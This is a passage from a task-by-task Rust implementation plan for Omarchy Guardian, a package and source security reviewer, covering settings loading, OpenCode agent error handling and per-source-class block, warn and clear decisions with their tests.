    pub fn system_path(&self) -> &Path {
        &self.system_path
    }

    pub fn user_path(&self) -> Option<&Path> {
        self.user_path.as_deref()
    }
}
```

`src/config/mod.rs` becomes:

```rust
//! Settings: built-in profiles, the system and user config files, and how
//! they combine into a per-source-class policy.

pub mod file;
pub mod load;
pub mod model;
pub mod resolve;

pub use load::Settings;
```

- [ ] **Step 4: Run tests**

Run: `cargo test config::`
Expected: all config tests pass.

- [ ] **Step 5: Verify and commit**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test`

```bash
git add src/config
git commit -m "Load settings from the system and user config files

The system file must be root-owned; an insecure or invalid one blocks
pacman-enforced classes instead of silently falling back. An invalid
user file is ignored with a warning, which is safe because it can only
tighten those classes. Agent model, variant and input limit for
pacman-enforced classes come from the system file only."
```

---

### Task 7: Agent runs with model, variant and timeout; unavailable vs invalid

**Files:**
- Modify: `src/agent.rs`, `src/review.rs` (`run_agent` call site), `src/test_support.rs`

**Interfaces:**
- Consumes: `config::model::AgentSettings`.
- Produces:
  - `pub enum AgentError { Unavailable(Error), Invalid(Error) }` with `pub fn into_error(self) -> Error`
  - `pub fn review(opencode: &Path, files: &[SourceFile], settings: &AgentSettings) -> Result<AgentReview, AgentError>`
  - `pub fn extract_text_events(output: &str) -> Result<String, AgentError>`
  - `test_support::mock_opencode_failing(dir: &Path, stderr: &str) -> PathBuf`

- [ ] **Step 1: Write failing tests**

In `src/test_support.rs` add:

```rust
/// A fake `opencode` that fails the way a provider or model error does.
pub fn mock_opencode_failing(dir: &Path, stderr: &str) -> PathBuf {
    let binary = dir.join("opencode");
    write_script(
        &binary,
        &format!("#!/bin/sh\ncat >/dev/null\nprintf '%s\\n' '{stderr}' >&2\nexit 1\n"),
    );
    binary
}
```

In `src/agent.rs` tests, update existing calls `review(&binary, &files)` to `review(&binary, &files, &AgentSettings::default())`, import `crate::config::model::{AgentSettings, Thinking}` and `super::AgentError`, and add:

```rust
    #[test]
    fn model_and_variant_are_passed_to_opencode() {
        let dir = TempDir::new("opencode-settings");
        let binary = mock_opencode(dir.path(), "clear", true);
        let settings = AgentSettings {
            model: Some("anthropic/claude-sonnet-5".into()),
            thinking: Thinking::High,
            variant: Some("high".into()),
            ..AgentSettings::default()
        };
        let files = [SourceFile {
            path: "a.sh".into(),
            content: "true\n".into(),
        }];

        review(&binary, &files, &settings).unwrap();

        let args = fs::read_to_string(dir.path().join("args")).unwrap();
        let args: Vec<&str> = args.lines().collect();
        let model = args.iter().position(|arg| *arg == "--model").unwrap();
        assert_eq!(args[model + 1], "anthropic/claude-sonnet-5");
        let variant = args.iter().position(|arg| *arg == "--variant").unwrap();
        assert_eq!(args[variant + 1], "high");
    }

    #[test]
    fn default_settings_pass_no_model_or_variant() {
        let dir = TempDir::new("opencode-defaults");
        let binary = mock_opencode(dir.path(), "clear", true);
        let files = [SourceFile {
            path: "a.sh".into(),
            content: "true\n".into(),
        }];

        review(&binary, &files, &AgentSettings::default()).unwrap();

        let args = fs::read_to_string(dir.path().join("args")).unwrap();
        assert!(!args.contains("--model") && !args.contains("--variant"));
    }

    #[test]
    fn provider_errors_are_unavailable() {
        let dir = TempDir::new("opencode-provider-error");
        let binary = mock_opencode_failing(dir.path(), "ProviderModelNotFoundError: no such variant xhigh");
        let files = [SourceFile {
            path: "a.sh".into(),
            content: "true\n".into(),
        }];

        let error = review(&binary, &files, &AgentSettings::default()).unwrap_err();
        let AgentError::Unavailable(error) = error else {
            panic!("expected unavailable, got {error:?}");
        };
        assert!(error.to_string().contains("xhigh"));

        let missing = review(
            std::path::Path::new("/nonexistent/opencode"),
            &files,
            &AgentSettings::default(),
        );
        assert!(matches!(missing, Err(AgentError::Unavailable(_))));
    }

    #[test]
    fn bad_replies_are_invalid() {
        let dir = TempDir::new("opencode-bad-reply");
        let binary = mock_opencode(dir.path(), "clear", false);
        let files = [SourceFile {
            path: "a.sh".into(),
            content: "true\n".into(),
        }];
        assert!(matches!(
            review(&binary, &files, &AgentSettings::default()),
            Err(AgentError::Invalid(_))
        ));
        assert!(matches!(
            extract_text_events(r#"{"type":"tool_use","part":{}}"#),
            Err(AgentError::Invalid(_))
        ));
        assert!(matches!(
            extract_text_events(r#"{"type":"error","error":{"data":{"message":"rate limited"}}}"#),
            Err(AgentError::Unavailable(_))
        ));
    }
```

Also change the existing `rejects_tool_calls_errors_and_empty_replies` assertions from `.is_err()` — they still hold; keep them.

- [ ] **Step 2: Run to verify failure**

Run: `cargo test agent`
Expected: compile errors (`AgentError`, third argument).

- [ ] **Step 3: Implement**

In `src/agent.rs`:

1. Replace the `LIMITS` const with:

```rust
const MAX_OUTPUT: usize = 4 * 1024 * 1024;
```

2. Add the error type after `SourceFile`:

```rust
/// Why a review produced no verdict. `Unavailable` follows the class's `ai`
/// policy; `Invalid` always blocks, because a reviewer that answers wrongly
/// is not the same as a reviewer that is absent.
#[derive(Debug)]
pub enum AgentError {
    /// No binary, spawn failure, provider/model/variant error, timeout.
    Unavailable(Error),
    /// Malformed events or reply, missing nonce, tool use, oversized output.
    Invalid(Error),
}

impl AgentError {
    pub fn into_error(self) -> Error {
        match self {
            Self::Unavailable(error) | Self::Invalid(error) => error,
        }
    }
}
```

3. Replace `review` with:

```rust
pub fn review(
    opencode: &Path,
    files: &[SourceFile],
    settings: &AgentSettings,
) -> Result<AgentReview, AgentError> {
    let nonce = random_nonce().map_err(AgentError::Unavailable)?;
    let request = build_request(files, &nonce);
    let config = opencode_config().to_string();

    let mut args: Vec<OsString> = [
        "--pure",
        "run",
        "--format",
        "json",
        "--agent",
        "guardian-review",
        "--dir",
        "/usr",
    ]
    .into_iter()
    .map(OsString::from)
    .collect();
    if let Some(model) = &settings.model {
        args.extend(["--model".into(), OsString::from(model)]);
    }
    if let Some(variant) = &settings.variant {
        args.extend(["--variant".into(), OsString::from(variant)]);
    }
    args.push(MESSAGE.into());

    let captured = tools::run(
        opencode,
        &args,
        Some(request.as_bytes()),
        &[("OPENCODE_CONFIG_CONTENT", &config), ("NO_COLOR", "1")],
        Limits {
            timeout_secs: settings.timeout_secs,
            max_output: MAX_OUTPUT,
        },
    )
    .map_err(|error| match error {
        Error::OutputTooLarge { .. } => AgentError::Invalid(error),
        other => AgentError::Unavailable(other),
    })?;
    let output = captured.into_success().map_err(AgentError::Unavailable)?;

    let text = extract_text_events(&String::from_utf8_lossy(&output))?;
    parse_review(&text, &nonce).map_err(AgentError::Invalid)
}
```

Add `use std::ffi::OsString;` and `use crate::config::model::AgentSettings;`.

4. Change `extract_text_events` to return `Result<String, AgentError>`: wrap the JSON parse error and the `tool_use` and "no review text" errors in `AgentError::Invalid(...)`, and the `"error"` event in `AgentError::Unavailable(...)`:

```rust
pub fn extract_text_events(output: &str) -> Result<String, AgentError> {
    let mut response = String::new();

    for line in output.lines().filter(|line| !line.trim().is_empty()) {
        let event = Json::parse(line).map_err(|error| {
            AgentError::Invalid(Error::parse("OpenCode event stream", error))
        })?;
        match event.get("type").and_then(Json::as_str) {
            Some("error") => {
                let message = event
                    .get("error")
                    .and_then(|error| error.get("data"))
                    .and_then(|data| data.get("message"))
                    .and_then(Json::as_str)
                    .unwrap_or("OpenCode reported an agent error");
                return Err(AgentError::Unavailable(Error::ToolFailed {
                    tool: "opencode".into(),
                    detail: message.to_string(),
                }));
            }
            Some("tool_use") => {
                return Err(AgentError::Invalid(Error::Refused(
                    "OpenCode attempted to use a tool during source review".into(),
                )));
            }
            Some("text") => {
                if let Some(text) = event
                    .get("part")
                    .and_then(|part| part.get("text"))
                    .and_then(Json::as_str)
                {
                    response.push_str(text);
                }
            }
            Some(_) | None => {}
        }
    }

    if response.is_empty() {
        Err(AgentError::Invalid(Error::Refused(
            "OpenCode returned no review text".into(),
        )))
    } else {
        Ok(response)
    }
}
```

5. In `src/review.rs::run_agent`, keep behaviour identical for now:

```rust
    let result = opencode.resolve().and_then(|binary| {
        agent::review(&binary, &report.agent_input, &AgentSettings::default())
            .map_err(AgentError::into_error)
    });
```

with `use crate::agent::{self, AgentError, SourceFile};` and `use crate::config::model::AgentSettings;` (the `config` module is now reachable from `main`, but keep its dead-code marker until Task 9 since most of it still is not).

- [ ] **Step 4: Run tests**

Run: `cargo test agent review`
Expected: all pass.

- [ ] **Step 5: Verify and commit**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test`

```bash
git add src/agent.rs src/review.rs src/test_support.rs
git commit -m "Pass model, variant and timeout to OpenCode; split agent errors

Reviews take AgentSettings so a class can use its own model and
thinking level. Errors are split into unavailable (policy decides) and
invalid (always blocks), because a reviewer that answers wrongly must
never be treated like one that is merely down."
```

---

### Task 8: Decisions instead of a fixed verdict

**Files:**
- Modify: `src/report.rs`, `src/review.rs`, `src/cli.rs`, `src/pacman.rs`

**Interfaces:**
- Consumes: `config::model::{Action, AiRequirement, Policy, SourceClass, builtin, Profile}`, `agent::{AgentError, AgentReview, Status}`.
- Produces (in `report`):
  - `pub enum AgentOutcome { Reviewed(AgentReview), Unavailable(Error) }`
  - `pub struct AgentRun { pub files: Vec<String>, pub label: String, pub outcome: AgentOutcome }`
  - `Report` fields: remove `agent`; add `pub class: SourceClass`, `pub file_classes: HashMap<String, SourceClass>`, `pub agent_runs: Vec<AgentRun>`, `pub profile: String`
  - `pub fn class_of(&self, path: &str) -> SourceClass`
  - `pub enum Blocked { Findings, Incomplete, AiUnavailable, NotConfirmed }`
  - `pub enum Decision { Clear, Warned, Limited, Blocked(Blocked) }` with `pub fn exit_code(self) -> ExitCode` and `pub fn allows_running(self) -> bool`
  - `pub fn decide(&self, policy_for: &dyn Fn(SourceClass) -> Policy) -> Decision`
  - `pub fn print(&self, show_hashes: bool, decision: Decision)`
  - `Verdict` is deleted.

- [ ] **Step 1: Write failing tests**

Replace the `tests` module of `src/report.rs` (keep `colors_can_be_disabled`) with:

```rust
#[cfg(test)]
mod tests {
    use super::{AgentOutcome, AgentRun, Blocked, Decision, Gap, LocalFinding, Painter, Report};
    use crate::agent::{AgentFinding, AgentReview, Status};
    use crate::config::model::{Profile, SourceClass, builtin};
    use crate::error::Error;
    use crate::osv::{Advisory, Audit};
    use crate::report::Severity;
    use crate::rules::RuleId;

    fn standard(class: SourceClass) -> crate::config::model::Policy {
        builtin(Profile::Standard, class)
    }

    fn reviewed(status: Status, files: &[&str]) -> AgentRun {
        AgentRun {
            files: files.iter().map(ToString::to_string).collect(),
            label: "m · high".into(),
            outcome: AgentOutcome::Reviewed(AgentReview {
                status,
                summary: "summary".into(),
                findings: Vec::new(),
            }),
        }
    }

    fn unavailable(files: &[&str]) -> AgentRun {
        AgentRun {
            files: files.iter().map(ToString::to_string).collect(),
            label: "m · high".into(),
            outcome: AgentOutcome::Unavailable(Error::Refused("provider down".into())),
        }
    }

    fn finding(path: &str) -> LocalFinding {
        LocalFinding {
            path: path.into(),
            line: 1,
            rule: RuleId::PrivilegeEscalation,
            excerpt: String::new(),
        }
    }

    fn report(class: SourceClass) -> Report {
        Report {
            class,
            text_files_reviewed: 1,
            ..Report::default()
        }
    }

    #[test]
    fn an_empty_scriptlet_review_is_limited() {
        assert_eq!(Report::default().decide(&standard), Decision::Limited);
    }

    #[test]
    fn a_clean_review_is_clear() {
        let mut report = report(SourceClass::Aur);
        report.agent_runs.push(reviewed(Status::Clear, &["PKGBUILD"]));
        assert_eq!(report.decide(&standard), Decision::Clear);
    }

    #[test]
    fn official_proceeds_when_ai_is_unavailable_under_standard() {
        let mut official = report(SourceClass::Official);
        official.agent_runs.push(unavailable(&["a/.INSTALL"]));
        assert_eq!(official.decide(&standard), Decision::Warned);

        let mut aur = report(SourceClass::Aur);
        aur.agent_runs.push(unavailable(&["PKGBUILD"]));
        assert_eq!(aur.decide(&standard), Decision::Blocked(Blocked::AiUnavailable));
    }

    #[test]
    fn local_findings_follow_on_findings() {
        let mut official = report(SourceClass::Official);
        official.findings.push(finding("a/.INSTALL"));
        official.agent_runs.push(reviewed(Status::Clear, &["a/.INSTALL"]));
        assert_eq!(official.decide(&standard), Decision::Warned);

        let mut theme = report(SourceClass::Theme);
        theme.findings.push(finding("hyprland.lua"));
        theme.agent_runs.push(reviewed(Status::Clear, &["hyprland.lua"]));
        assert_eq!(theme.decide(&standard), Decision::Blocked(Blocked::Findings));
    }

    #[test]
    fn ai_suspicion_blocks_official_under_standard() {
        let mut official = report(SourceClass::Official);
        official.agent_runs.push(reviewed(Status::Suspicious, &["a/.INSTALL"]));
        assert_eq!(official.decide(&standard), Decision::Blocked(Blocked::Findings));
    }

    #[test]
    fn inconclusive_and_gaps_are_incomplete_in_every_profile() {
        let lenient = |class| builtin(Profile::LocalOnly, class);

        let mut inconclusive = report(SourceClass::Official);
        inconclusive.agent_runs.push(reviewed(Status::Inconclusive, &["a"]));
        assert_eq!(inconclusive.decide(&lenient), Decision::Blocked(Blocked::Incomplete));

        let mut gap = report(SourceClass::Official);
        gap.gaps.push(Gap::NoReviewableFiles);
        assert_eq!(gap.decide(&lenient), Decision::Blocked(Blocked::Incomplete));
    }

    #[test]
    fn findings_are_attributed_to_their_files_class() {
        let mut mixed = report(SourceClass::ThirdPartyRepo);
        mixed.file_classes.insert("core-pkg/.INSTALL".into(), SourceClass::Official);
        mixed.file_classes.insert("chaotic-pkg/.INSTALL".into(), SourceClass::ThirdPartyRepo);

        let mut run = reviewed(Status::Suspicious, &["core-pkg/.INSTALL", "chaotic-pkg/.INSTALL"]);
        if let AgentOutcome::Reviewed(review) = &mut run.outcome {
            review.findings.push(AgentFinding {
                severity: Severity::Medium,
                file: "core-pkg/.INSTALL".into(),
                line: None,
                title: "t".into(),
                reason: "r".into(),
            });
        }
        mixed.agent_runs.push(run);

        // Only the official file was named, and official blocks on AI
        // suspicion under standard too, so this blocks either way; with a
        // warn policy for official it must only warn.
        let warn_official = |class| {
            let mut policy = standard(class);
            if class == SourceClass::Official {
                policy.on_ai_suspicious = crate::config::model::Action::Warn;
            }
            policy
        };
        assert_eq!(mixed.decide(&warn_official), Decision::Warned);
        assert_eq!(mixed.decide(&standard), Decision::Blocked(Blocked::Findings));
    }

    #[test]
    fn advisories_follow_the_reports_class() {
        let mut aur = report(SourceClass::Aur);
        aur.agent_runs.push(reviewed(Status::Clear, &["Cargo.lock"]));
        aur.audit = Some(Audit {
            advisories: vec![Advisory {
                id: "GHSA-x".into(),
                package: "p".into(),
                version: "1".into(),
                lockfile: "Cargo.lock".into(),
                severity: None,
                summary: None,
            }],
            truncated: false,
        });
        assert_eq!(aur.decide(&standard), Decision::Blocked(Blocked::Findings));
        assert_eq!(aur.counts().medium, 1);
    }

    #[test]
    fn decisions_map_to_exit_codes() {
        use std::process::ExitCode;
        assert_eq!(Decision::Clear.exit_code(), ExitCode::SUCCESS);
        assert_eq!(Decision::Warned.exit_code(), ExitCode::SUCCESS);
        assert_eq!(Decision::Limited.exit_code(), ExitCode::SUCCESS);
        assert_eq!(Decision::Blocked(Blocked::Findings).exit_code(), ExitCode::from(1));
        for blocked in [Blocked::Incomplete, Blocked::AiUnavailable, Blocked::NotConfirmed] {
            assert_eq!(Decision::Blocked(blocked).exit_code(), ExitCode::from(2));
        }
        assert!(Decision::Warned.allows_running());
        assert!(!Decision::Limited.allows_running());
    }

    #[test]
    fn colors_can_be_disabled() {
        assert_eq!(Painter { enabled: false }.paint("CLEAR", "32"), "CLEAR");
        assert_eq!(
            Painter { enabled: true }.paint("CLEAR", "32"),
            "\x1b[32mCLEAR\x1b[0m"
        );
    }
}
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test report`
Expected: compile errors.

- [ ] **Step 3: Implement in `src/report.rs`**

1. Imports: add `use std::collections::HashMap;`, `use crate::config::model::{Action, AiRequirement, Policy, SourceClass};`; change the agent import to `use crate::agent::{AgentReview, SourceFile, Status};`.

2. Replace `Verdict` and its impl with:

```rust
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Blocked {
    Findings,
    Incomplete,
    AiUnavailable,
    NotConfirmed,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Decision {
    Clear,
    Warned,
    /// Nothing reviewable existed (a pacman transaction without scriptlets).
    Limited,
    Blocked(Blocked),
}

impl Decision {
    pub fn exit_code(self) -> ExitCode {
        match self {
            Self::Clear | Self::Warned | Self::Limited => ExitCode::SUCCESS,
            Self::Blocked(Blocked::Findings) => ExitCode::from(1),
            Self::Blocked(Blocked::Incomplete | Blocked::AiUnavailable | Blocked::NotConfirmed) => {
                ExitCode::from(2)
            }
        }
    }

    /// Whether `guard` and `sandbox` may start their command.
    pub const fn allows_running(self) -> bool {
        match self {
            Self::Clear | Self::Warned => true,
            Self::Limited | Self::Blocked(_) => false,
        }
    }
}

#[derive(Debug)]
pub enum AgentOutcome {
    Reviewed(AgentReview),
    Unavailable(Error),
}

/// One OpenCode call and the files it covered.
#[derive(Debug)]
pub struct AgentRun {
    pub files: Vec<String>,
    /// `model · thinking`, from `AgentSettings::label`.
    pub label: String,
    pub outcome: AgentOutcome,
}
```

3. In `struct Report`: delete `pub agent: Option<AgentReview>,`; add

```rust
    /// Class of every file not listed in `file_classes`.
    pub class: SourceClass,
    /// Per-file classes when one report spans several (pacman transactions).
    pub file_classes: HashMap<String, SourceClass>,
    pub agent_runs: Vec<AgentRun>,
    /// Profile name shown next to AI verdicts.
    pub profile: String,
```

4. Replace `verdict` with `class_of` and `decide`, plus a private tally:

```rust
    pub fn class_of(&self, path: &str) -> SourceClass {
        self.file_classes.get(path).copied().unwrap_or(self.class)
    }

    fn run_classes(&self, run: &AgentRun) -> Vec<SourceClass> {
        let mut classes: Vec<SourceClass> = run.files.iter().map(|file| self.class_of(file)).collect();
        classes.sort();
        classes.dedup();
        if classes.is_empty() {
            classes.push(self.class);
        }
        classes
    }

    /// Spec §9. Precedence: incomplete, AI unavailable, findings, warned,
    /// then limited or clear.
    pub fn decide(&self, policy_for: &dyn Fn(SourceClass) -> Policy) -> Decision {
        if !self.gaps.is_empty() {
            return Decision::Blocked(Blocked::Incomplete);
        }

        let mut tally = Tally::default();
        for run in &self.agent_runs {
            let classes = self.run_classes(run);
            match &run.outcome {
                AgentOutcome::Unavailable(_) => {
                    for class in classes {
                        if policy_for(class).ai == AiRequirement::Required {
                            tally.ai_unavailable = true;
                        } else {
                            tally.warned = true;
                        }
                    }
                }
                AgentOutcome::Reviewed(review) if review.status == Status::Inconclusive => {
                    return Decision::Blocked(Blocked::Incomplete);
                }
                AgentOutcome::Reviewed(review) => {
                    let mut flagged: Vec<SourceClass> = review
                        .findings
                        .iter()
                        .flat_map(|finding| {
                            if run.files.contains(&finding.file) {
                                vec![self.class_of(&finding.file)]
                            } else {
                                classes.clone()
                            }
                        })
                        .collect();
                    if review.status == Status::Suspicious && flagged.is_empty() {
                        flagged.clone_from(&classes);
                    }
                    for class in flagged {
                        tally.apply(policy_for(class).on_ai_suspicious);
                    }
                }
            }
        }

        for finding in &self.findings {
            tally.apply(policy_for(self.class_of(&finding.path)).on_findings);
        }
        if self
            .audit
            .as_ref()
            .is_some_and(|audit| !audit.advisories.is_empty())
        {
            tally.apply(policy_for(self.class).on_findings);
        }

        if tally.ai_unavailable {
            Decision::Blocked(Blocked::AiUnavailable)
        } else if tally.blocked {
            Decision::Blocked(Blocked::Findings)
        } else if tally.warned {
            Decision::Warned
        } else if self.text_files_reviewed == 0 && self.agent_runs.is_empty() {
            Decision::Limited
        } else {
            Decision::Clear
        }
    }
```

and after `impl Counts`:

```rust
#[derive(Default)]
struct Tally {
    ai_unavailable: bool,
    blocked: bool,
    warned: bool,
}

impl Tally {
    fn apply(&mut self, action: Action) {
        match action {
            Action::Block => self.blocked = true,
            Action::Warn => self.warned = true,
        }
    }
}
```

5. `counts`: replace the agent loop with

```rust
        let agent_findings = self.agent_runs.iter().flat_map(|run| match &run.outcome {
            AgentOutcome::Reviewed(review) => review.findings.as_slice(),
            AgentOutcome::Unavailable(_) => &[],
        });
        for finding in agent_findings {
            counts.add(finding.severity);
        }
```

6. `print` takes the decision:

```rust
    pub fn print(&self, show_hashes: bool, decision: Decision) {
        let painter = Painter::for_stdout();

        println!("Omarchy Guardian  ·  {}", self.subject);
        self.print_headline(decision, painter);
        self.print_coverage(show_hashes, painter);
        self.print_inventory();
        self.print_agent_summary(painter);
        self.print_findings(decision, painter);

        for gap in &self.gaps {
            eprintln!("  ! {gap}");
        }
        println!(
            "\n{}",
            match decision {
                Decision::Blocked(Blocked::Findings) => {
                    "Recommendation: do not install or run this source until findings are resolved."
                }
                Decision::Blocked(Blocked::Incomplete) => {
                    "Recommendation: do not proceed; complete the review first."
                }
                Decision::Blocked(Blocked::AiUnavailable) => {
                    "Recommendation: fix the OpenCode setup (see `omarchy-guardian setup`) and retry."
                }
                Decision::Blocked(Blocked::NotConfirmed) => "Not confirmed; nothing was run.",
                Decision::Warned => "Proceeding with warnings; read them above.",
                Decision::Limited => {
                    "Scope: package payloads were not inspected by this scriptlet-only review."
                }
                Decision::Clear => "Scope: this is a heuristic source review, not a safety guarantee.",
            }
        );
    }
```

7. `print_headline(&self, decision: Decision, painter)` — replace the verdict match:

```rust
        let (headline, color) = match decision {
            Decision::Clear => ("✓ CLEAR — no known concerns found".to_string(), "32"),
            Decision::Warned => (
                format!("! WARNED — {total} alert(s); allowed by policy for this source"),
                "33;1",
            ),
            Decision::Blocked(Blocked::Findings) if counts.high > 0 => (
                format!("✗ HIGH RISK — {total} alert(s) across local and AI review"),
                "31;1",
            ),
            Decision::Blocked(Blocked::Findings) => (
                format!("! REVIEW REQUIRED — {total} alert(s) across local and AI review"),
                "33;1",
            ),
            Decision::Blocked(Blocked::Incomplete) => (
                "! INCOMPLETE — this scan is not a clean result".to_string(),
                "33;1",
            ),
            Decision::Blocked(Blocked::AiUnavailable) => (
                "! AI REVIEW UNAVAILABLE — this source needs a completed AI review".to_string(),
                "33;1",
            ),
            Decision::Blocked(Blocked::NotConfirmed) => (
                "! NOT CONFIRMED — local checks passed but nothing was approved".to_string(),
                "33;1",
            ),
            Decision::Limited => (
                "· LIMITED REVIEW — no text install scripts were available".to_string(),
                "36;1",
            ),
        };
```

8. `print_agent_summary`:

```rust
    fn print_agent_summary(&self, painter: Painter) {
        if self.agent_input_overflowed {
            println!("OpenCode review: not run — source exceeds the AI input limit");
        }
        for run in &self.agent_runs {
            match &run.outcome {
                AgentOutcome::Reviewed(review) => {
                    let color = match review.status {
                        Status::Clear => "32",
                        Status::Suspicious => "31;1",
                        Status::Inconclusive => "33;1",
                    };
                    println!(
                        "OpenCode: {} · {} · profile {} — {}",
                        painter.paint(review.status.label(), color),
                        run.label,
                        self.profile,
                        review.summary
                    );
                }
                AgentOutcome::Unavailable(error) => println!(
                    "OpenCode: {} · {} · profile {} — {error}",
                    painter.paint("UNAVAILABLE", "33;1"),
                    run.label,
                    self.profile
                ),
            }
        }
    }
```

9. `print_findings(&self, decision: Decision, painter)`: change `if verdict != Verdict::Limited` to `if decision != Decision::Limited`, and replace the `if let Some(review) = self.agent.as_ref().filter(...)` block with a loop over `self.agent_runs` printing each `Reviewed` review's findings under the `"\nOpenCode findings:"` heading (print the heading once, before the first finding).

- [ ] **Step 4: Adapt the callers**

`src/review.rs::run_agent` — push runs instead of setting `report.agent`:

```rust
pub fn run_agent(report: &mut Report, opencode: &OpenCode) {
    let has_oversized = report.snapshot.count(FileKind::OversizedText) > 0;
    if report.agent_input.is_empty() || report.agent_input_overflowed || has_oversized {
        return;
    }

    let settings = AgentSettings::default();
    let outcome = match opencode.resolve() {
        Err(error) => AgentOutcome::Unavailable(error),
        Ok(binary) => match agent::review(&binary, &report.agent_input, &settings) {
            Ok(review) => AgentOutcome::Reviewed(review),
            Err(AgentError::Unavailable(error)) => AgentOutcome::Unavailable(error),
            Err(AgentError::Invalid(error)) => {
                report.gaps.push(Gap::Agent(error));
                return;
            }
        },
    };
    report.agent_runs.push(AgentRun {
        files: report.agent_input.iter().map(|file| file.path.clone()).collect(),
        label: settings.label(),
        outcome,
    });
}
```

`src/cli.rs` — keep today's fail-closed behaviour until Task 9 by deciding with the `strict` profile:

```rust
fn strict(class: SourceClass) -> Policy {
    builtin(Profile::Strict, class)
}
```

and in `scan_command`, `guard_command`, `sandbox_command` and `pacman_hook_command` replace `report.print(...)` / `report.verdict()` with:

```rust
    let decision = report.decide(&strict);
    report.print(target.show_hashes, decision);
```

In `guard_command` and `sandbox_command` replace `if verdict != Verdict::Clear` with `if !decision.allows_running()` and return `decision.exit_code()`.

`src/review.rs` tests and `src/cli.rs` tests: replace every `report.verdict()` with `report.decide(&|class| builtin(Profile::Strict, class))`, `Verdict::Incomplete` with `Decision::Blocked(Blocked::Incomplete)`, `Verdict::Clear` with `Decision::Clear`, and `report.agent` status checks with:

```rust
        assert!(matches!(
            report.agent_runs.as_slice(),
            [AgentRun { outcome: AgentOutcome::Reviewed(review), .. }] if review.status == Status::Clear
        ));
```

In `review.rs` test `malicious_theme_is_flagged_and_a_failed_agent_is_incomplete`, the missing binary is now `AgentOutcome::Unavailable`, not a gap: change the gap assertion to `assert!(matches!(report.agent_runs[0].outcome, AgentOutcome::Unavailable(_)))` and expect `Decision::Blocked(Blocked::AiUnavailable)`. In `cli.rs` `guard_blocks_when_the_agent_is_unavailable` still expects exit code 2.

- [ ] **Step 5: Run tests, verify and commit**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test`
Expected: all pass.

```bash
git add src/report.rs src/review.rs src/cli.rs src/pacman.rs
git commit -m "Decide outcomes from findings plus a per-class policy

The report no longer computes a fixed verdict. decide() weighs gaps,
agent runs, local findings and advisories against the policy of each
file's source class, adding the WARNED and AI-unavailable outcomes.
Callers still use the strict profile, so behaviour is unchanged until
settings are wired in."
```

---

### Task 9: Settings-driven review pipeline and CLI flags

**Files:**
- Modify: `src/review.rs`, `src/report.rs`, `src/cli.rs`, `src/pacman.rs`, `src/main.rs`, `src/tomlish.rs`, `src/config/*` (remove dead-code markers)

**Interfaces:**
- Consumes: `Settings`, `Decision`, `AgentRun`, `agent::review`.
- Produces:
  - `pub struct ReviewContext<'a> { pub settings: &'a Settings, pub class: SourceClass, pub opencode: &'a OpenCode }`
  - `pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report`
  - `pub fn run_agents(report: &mut Report, settings: &Settings, opencode: &OpenCode)` (replaces `run_agent`)
  - `Report` gains `pub agent_input_limit: usize` (set by `Report::new` to `DEFAULT_MAX_INPUT_KIB * 1024`)
  - `cli::Confirm` trait: `fn confirm(&mut self, question: &str) -> bool`; `TtyConfirm`
  - `Target` gains `class: SourceClass`, `profile: Option<Profile>`
  - `pacman::review_transaction(args: &HookArgs, settings: &Settings) -> Result<Report, Error>`

- [ ] **Step 1: Write failing tests**

In `src/review.rs` tests, add (and update existing tests to call `review_tree(&config, &context(&settings, SourceClass::Source, &opencode))`):

```rust
    fn context<'a>(
        settings: &'a Settings,
        class: SourceClass,
        opencode: &'a OpenCode,
    ) -> ReviewContext<'a> {
        ReviewContext {
            settings,
            class,
            opencode,
        }
    }

    #[test]
    fn local_only_never_calls_the_agent() {
        let dir = TempDir::new("local-only");
        let bin = TempDir::new("local-only-bin");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
        let settings = Settings::from_parts(PartialConfig::default(), PartialConfig::default())
            .with_profile(Profile::LocalOnly);

        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Theme, &opencode),
        );

        assert!(report.agent_runs.is_empty());
        assert!(!bin.path().join("stdin").exists());
        assert_eq!(report.decide(&|class| settings.policy(class)), Decision::Clear);
    }

    #[test]
    fn the_input_limit_comes_from_settings() {
        let dir = TempDir::new("input-limit");
        fs::write(dir.path().join("big.txt"), "a".repeat(40 * 1024)).unwrap();
        let system = PartialConfig {
            agent: AgentDefaults {
                max_input_kib: Some(16),
                ..AgentDefaults::default()
            },
            ..PartialConfig::default()
        };
        let settings = Settings::from_parts(system, PartialConfig::default());

        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &unavailable()),
        );
        assert!(report.agent_input_overflowed);
    }

    #[test]
    fn classes_with_equal_agent_settings_share_one_run() {
        let bin = TempDir::new("grouped-bin");
        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
        let settings = Settings::from_parts(PartialConfig::default(), PartialConfig::default());

        let mut report = Report::new("transaction");
        report.class = SourceClass::ThirdPartyRepo;
        report.file_classes.insert("a/.INSTALL".into(), SourceClass::Official);
        report.file_classes.insert("b/.INSTALL".into(), SourceClass::LocalPackage);
        report.file_classes.insert("c/.INSTALL".into(), SourceClass::ThirdPartyRepo);
        for path in ["a/.INSTALL", "b/.INSTALL", "c/.INSTALL"] {
            analyze_text(&mut report, path, "post_install() { true; }\n", false);
        }

        run_agents(&mut report, &settings, &opencode);

        // Official uses low thinking; the other two share high thinking.
        assert_eq!(report.agent_runs.len(), 2);
        let files: Vec<&[String]> = report.agent_runs.iter().map(|run| run.files.as_slice()).collect();
        assert!(files.contains(&&["a/.INSTALL".to_string()][..]));
    }
```

In `src/cli.rs` tests add:

```rust
    struct Scripted(Option<bool>, Vec<String>);

    impl Confirm for Scripted {
        fn confirm(&mut self, question: &str) -> bool {
            self.1.push(question.to_string());
            self.0.unwrap_or(false)
        }
    }

    fn local_only() -> Settings {
        Settings::from_parts(PartialConfig::default(), PartialConfig::default())
            .with_profile(Profile::LocalOnly)
    }

    #[test]
    fn local_only_asks_before_running() {
        let dir = TempDir::new("confirm-yes");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let target = Target {
            class: SourceClass::Theme,
            ..target(&dir)
        };

